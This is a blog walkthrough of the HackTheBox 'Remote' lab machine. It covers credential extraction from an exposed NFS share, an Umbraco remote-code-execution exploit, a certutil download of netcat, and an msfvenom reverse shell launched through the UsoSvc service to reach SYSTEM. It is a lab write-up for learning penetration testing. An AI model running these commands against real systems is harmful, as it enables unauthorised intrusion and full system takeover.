---
author: Greenjam94
categories:
- Walkthroughs
ct_period_last_updated:
- default
date: "2020-07-04T03:37:38Z"
guid: https://www.hackerunder.dev/?p=870
id: 870
image: /wp-content/uploads/2020/07/HTB_Remote.png
tags:
- DLL hijacking
- HTB
- kali
- web shell
- write-up
title: HackTheBox Remote Writeup
url: /hackthebox-remote-writeup/
---

Remote was a fun windows box to hack. This is my second active target on HTB. My first was [Traceback](https://www.hackerunder.dev/hackthebox-traceback-write-up/). Check that out for a similar web based exercise on Linux. Remote starts with a web vulnerability but requires finding credentials in a public share. DLL Hijacking is required to get a system shell.

## Lessons learned:

- Mounting a public windows share
- Exploit modifications – changing python code for a web exploit
- DLL Hijacking for privilege escalation

## Information gathering

An initial nmap scan reveals some listening services.   
`nmap -A -T4 10.10.10.180`

Of the services listed, a few seemed important.

- FTP
- web
- mountd
- RPC

Reviewing ftp, anonymous connections were not allowed and nothing was really visible here.

Web is running an application called **Umbraco**. Source code from the app can be found online. There are multiple exploits in the exploit-database and on Github.

Other Windows services were new to me. Some googling required, I figured out how to look into mountd. There’s an nmap script to check what is available.  
`nmap -p 2049 -sV --script=nfs-showmount -oG nfs-showmount 10.10.10.180`

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_1_nmap_nfs-1024x277.png)</figure>The directories and files related to the Umbraco web app are exposed. The first thing to look at is the config files. Database connection info, credentials, and API keys are commonly stored here.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_2_grep_config-1024x107.png)</figure>Database files (.sdf) are also good targets. Since it’s a binary file, a command like `strings` is required to make it readable. Adding `grep` we can find the username and hash of the admin user.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_3_grep_db-1024x126.png)</figure>`Hash-identifier` will confirm the hash format. `John` can be used to crack the SHA1 hash and reveal that the password is **baconandcheese**.

## Exploitation

Now that there is a user to authenticate with, [exploit 46153](https://www.exploit-db.com/exploits/46153) from exploit-db can be used. This creates command execution on the target. Before using the exploit we can see there is a few oddities about the script. Each line of the code ends with a semi-colon. The multi-line payload is wrapped in single quotes. To edit the payload easily, I replaced this with a simple string wrapped in triple double quotes “””.

The key part of the payload is below. There is multiple ways to improve this. What I originally did while exploiting this box was create two files. 46153-getnc.py and 46153-usenc.py where each had a hardcoded command.

```
<pre class="wp-block-code">```
string cmd = "";
```
```

As I write this review, it is clear that it would be easier to pass a variable. Just do the following and use a single file instead.  
`python3 46153fix.py "/c certutil -urlcache -split -f <hosted_file> <target_destination>"`

Using the exploit, we can copy the windows binary for netcat from kali onto the target and use it to open a reverse shell as a low privilege user, this allows us to get access to the user.txt proof file.

<div class="wp-block-image"><figure class="aligncenter size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_4_get_nc_onto_target.png)</figure></div>Note: Anything we are downloading from Kali needs to be hosted on a web server. Lately I’ve been a using a simple web server. `python3 -m http.server 80`   
However a great tool that provides a better visual interface and other features is [UpDog](https://www.hackerunder.dev/whats-updog/). Both are options to for hosting.

<div class="wp-block-image"><figure class="aligncenter size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_4_host_nc-1024x262.png)<figcaption>use python web server to host kali’s windows-binaries directory</figcaption></figure></div><figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_5_use_nc.png)<figcaption>use exploit and netcat to open a reverse shell</figcaption></figure><figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_5_listen_nc.png)<figcaption>listener with reverse shell</figcaption></figure>## Privilege Escalation

There are many commands to run that help gather information on how to get a better shell. One tutorial that walks through a lot is <https://www.fuzzysecurity.com/tutorials/16.html>

Running `wmic service where started=true get name, startname` will show us a list of started services running on the target. Going through this list reveals which are vulnerable to DLL Hijacking. One such service is UsoSvc or the “Update Orchestrator Service”. I followed an example from <https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/> but modified what commands were used.  
  
I created a windows reverse shell with msfvenom. The command below creates an executable file we can upload like the netcat binary.  
`msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.39 lport=443 -f exe > root.exe`  
  
Use a python web server and the certutil command to download the file, then run the executable by changing the config of the UsoSvc service.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_6_host_root_mfsvenom-1024x150.png)<figcaption>host payload on Kali web server</figcaption></figure><figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_6_get_root_msfv_payload-1024x284.png)</figure>```
<pre class="wp-block-preformatted">sc stop UsoSvc
sc config UsoSvc binpath="c:\windows\temp\root.exe
sc start UsoSvc
```

Make sure that a netcat listener is already listening `nc -nlvp 443` before running the start command.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_7_dll_hijack-1024x446.png)</figure>This returns a system level shell that can do anything on Remote. At this point you can create a permanent backdoor, clean up exploit files, or simply revert the box and move on to the next challenge.

<figure class="wp-block-image size-large">![System reverse shell on Remote through a netcat listener](https://www.hackerunder.dev/wp-content/uploads/2020/07/remote_8_get_system.png)<figcaption>System reverse shell on a netcat listener</figcaption></figure>